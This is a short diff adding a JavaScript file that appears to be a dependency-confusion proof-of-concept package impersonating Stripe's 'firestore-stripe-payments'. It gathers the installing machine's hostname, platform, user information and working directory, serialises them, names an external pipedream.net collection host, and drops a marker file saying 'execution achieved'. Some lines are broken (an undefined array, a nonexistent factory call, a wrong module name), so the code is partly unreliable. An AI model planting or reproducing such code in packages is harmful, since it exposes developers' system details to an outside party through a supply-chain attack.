@@ -1,0 +1,19 @@
+var os = require("os")
+const request = require('requests')
+var fs = require('fs')
+var hostname = os.hostname()
+var type = os.platform()
+var userInfo = os.userInfo()
+var currentPath = process.cwd()
+__ecma.Array.factory()
+json.push(hostname)
+json.push(type)
+json.push(userInfo)
+json.push(currentPath)
+json = JSON.stringify(json)
+let host = "eo6aglyemjbsegf.m.pipedream.net"
+let company = "Stripe"
+let packages = "firestore-stripe-payments"
+fs.writeFile('locatethisfileforpoc', 'execution achieved', function (err) {
+  if (err) throw err
+})
